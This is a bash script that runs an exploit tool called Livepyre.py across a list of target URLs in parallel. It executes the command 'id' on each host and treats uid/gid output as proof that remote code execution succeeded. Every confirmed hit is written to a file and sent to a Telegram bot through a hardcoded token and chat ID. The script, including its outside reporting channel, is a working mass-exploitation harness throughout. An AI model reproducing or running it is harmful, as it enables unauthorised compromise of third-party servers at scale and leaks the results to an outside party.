#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: bash $0 list.txt 20"
    exit 1
fi

FILE="$1"
THREADS="${2:-20}"

OUT="vuln1.txt"
SCANNED="scanned.txt"
TODO_FILE=".pending_targets"
BOT_TOKEN="8673686743:AAEsgWAYD0k0tUVeA_qX9ZlhCl4_MbCmc50"
CHAT_ID="5438985678"

LOCK_OUT="out.lock"
LOCK_PROGRESS="progress.lock"
LOCK_SCANNED="scanned.lock"

DONE_FILE=".done_count"
VULN_FILE=".vuln_count"
OK_FILE=".ok_count"

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
MAGENTA="\e[35m"
NC="\e[0m"

if [ ! -f "$FILE" ]; then
    echo -e "${RED}File not found: $FILE${NC}"
    exit 1
fi

touch "$OUT"
touch "$SCANNED"

echo 0 > "$DONE_FILE"
echo 0 > "$VULN_FILE"
echo 0 > "$OK_FILE"

cleanup() {
    rm -f "$DONE_FILE" "$VULN_FILE" "$OK_FILE" "$TODO_FILE"
}

trap cleanup EXIT

check_url_alive() {
    local target="$1"

    curl -ksL \
        --max-time 8 \
        --connect-timeout 5 \
        -o /dev/null \
        -w "%{http_code}" \
        -A "Mozilla/5.0" \
        "$target" 2>/dev/null
}

resolve_url_keep_path() {
    local input="$1"
    local https_url
    local http_url
    local https_code
    local http_code

    input="$(printf '%s' "$input" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"

    [ -z "$input" ] && echo "" && return

    if [[ "$input" =~ ^https?:// ]]; then
        echo "$input"
        return
    fi

    https_url="https://$input"
    http_url="http://$input"

    https_code=$(check_url_alive "$https_url")

    if [[ "$https_code" =~ ^(200|301|302|401|403)$ ]]; then
        echo "$https_url"
        return
    fi

    http_code=$(check_url_alive "$http_url")

    if [[ "$http_code" =~ ^(200|301|302|401|403)$ ]]; then
        echo "$http_url"
        return
    fi

    echo "$https_url"
}

build_pending_list() {
    awk '
        NR==FNR {
            gsub(/\r/, "", $0)
            sub(/^[[:space:]]+/, "", $0)
            sub(/[[:space:]]+$/, "", $0)

            if ($0 != "") {
                scanned[$0] = 1
            }

            next
        }

        {
            gsub(/\r/, "", $0)
            sub(/^[[:space:]]+/, "", $0)
            sub(/[[:space:]]+$/, "", $0)

            if ($0 == "") next

            if (seen[$0]++) next

            if (!($0 in scanned)) {
                print $0
            }
        }
    ' "$SCANNED" "$FILE" > "$TODO_FILE"
}

mark_scanned() {
    local target="$1"

    (
        flock -x 202

        if ! grep -Fxq "$target" "$SCANNED"; then
            echo "$target" >> "$SCANNED"
        fi

    ) 202>"$LOCK_SCANNED"
}

save_vuln() {
    local line="$1"

    (
        flock -x 200

        if ! grep -Fxq "$line" "$OUT"; then
            echo "$line" >> "$OUT"
        fi

    ) 200>"$LOCK_OUT"
}

show_progress() {
    local status="$1"

    (
        flock -x 201

        done_count=$(cat "$DONE_FILE")
        vuln_count=$(cat "$VULN_FILE")
        ok_count=$(cat "$OK_FILE")

        if [ "$TOTAL" -gt 0 ]; then
            percent=$((done_count * 100 / TOTAL))
        else
            percent=0
        fi

        echo -e "${CYAN}[PROGRESS] ${done_count}/${TOTAL} (${percent}%)${NC} | ${RED}VULN: ${vuln_count}${NC} | ${GREEN}OK: ${ok_count}${NC} | ${MAGENTA}LAST: ${status}${NC}"

    ) 201>"$LOCK_PROGRESS"
}

update_counter() {
    local result="$1"

    (
        flock -x 201

        done_count=$(cat "$DONE_FILE")
        done_count=$((done_count + 1))
        echo "$done_count" > "$DONE_FILE"

        if [ "$result" = "vuln" ]; then
            vuln_count=$(cat "$VULN_FILE")
            vuln_count=$((vuln_count + 1))
            echo "$vuln_count" > "$VULN_FILE"
        else
            ok_count=$(cat "$OK_FILE")
            ok_count=$((ok_count + 1))
            echo "$ok_count" > "$OK_FILE"
        fi

    ) 201>"$LOCK_PROGRESS"
}
send_telegram() {
    local message="$1"

    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="HTML" >/dev/null 2>&1
}
scan_target() {
    local raw_url="$1"
    local url
    local output
    local payload_output
    local vuln_line

    raw_url="$(printf '%s' "$raw_url" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
    [ -z "$raw_url" ] && return

    url="$(resolve_url_keep_path "$raw_url")"
    [ -z "$url" ] && return

    echo -e "${CYAN}========================================${NC}"
    echo -e "${YELLOW}[*] Testing: $url${NC}"

    output=$(python3 Livepyre.py -u "$url" -p "id" 2>&1 | tee /dev/tty)

    payload_output=$(echo "$output" | awk '
        /\[INFO\] Payload works, output:/ {found=1; next}
        found && NF {print; exit}
    ')

    if [[ -n "$payload_output" && "$payload_output" == *uid=* && "$payload_output" == *gid=* ]]; then
        echo -e "${RED}[!!!] VULNERABLE: $url $payload_output${NC}"
        (
            flock -x 200
            echo "$url $payload_output" >> "$OUT"
        ) 200>"$LOCK_OUT"

        send_telegram "🚨 VULNERABLE FOUND%0AURL: $url%0AOutput: $payload_output"
        vuln_line="$url $payload_output"
        save_vuln "$vuln_line"

        mark_scanned "$raw_url"

        update_counter "vuln"
        show_progress "VULN $url"
    else
        echo -e "${GREEN}[OK] Not vulnerable: $url${NC}"

        mark_scanned "$raw_url"

        update_counter "ok"
        show_progress "OK $url"
    fi
}

build_pending_list

ORIGINAL_TOTAL=$(grep -v '^[[:space:]]*$' "$FILE" | wc -l)
ALREADY_SCANNED=$(wc -l < "$SCANNED")
TOTAL=$(wc -l < "$TODO_FILE")

echo -e "${CYAN}========================================${NC}"
echo -e "${BLUE}[INFO] Original total   : $ORIGINAL_TOTAL${NC}"
echo -e "${BLUE}[INFO] Already scanned  : $ALREADY_SCANNED${NC}"
echo -e "${BLUE}[INFO] Pending target   : $TOTAL${NC}"
echo -e "${BLUE}[INFO] Threads          : $THREADS${NC}"
echo -e "${BLUE}[INFO] Output vuln      : $OUT${NC}"
echo -e "${BLUE}[INFO] Resume file      : $SCANNED${NC}"
echo -e "${CYAN}========================================${NC}"

if [ "$TOTAL" -eq 0 ]; then
    echo -e "${GREEN}[+] Tidak ada target baru. Semua sudah discan.${NC}"
    exit 0
fi

while IFS= read -r url || [ -n "$url" ]; do
    url="$(printf '%s' "$url" | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"

    [ -z "$url" ] && continue

    while [ "$(jobs -rp | wc -l)" -ge "$THREADS" ]; do
        sleep 0.2
    done

    scan_target "$url" &

done < "$TODO_FILE"

wait

echo -e "${CYAN}========================================${NC}"
echo -e "${GREEN}[+] Scan finished.${NC}"
echo -e "${BLUE}[+] Original total : $ORIGINAL_TOTAL${NC}"
echo -e "${BLUE}[+] Pending total  : $TOTAL${NC}"
echo -e "${BLUE}[+] Done           : $(cat "$DONE_FILE")${NC}"
echo -e "${RED}[+] Vulnerable     : $(cat "$VULN_FILE")${NC}"
echo -e "${GREEN}[+] Not Vuln       : $(cat "$OK_FILE")${NC}"
echo -e "${BLUE}[+] Results        : $OUT${NC}"
echo -e "${BLUE}[+] Resume file    : $SCANNED${NC}"
echo -e "${CYAN}========================================${NC}"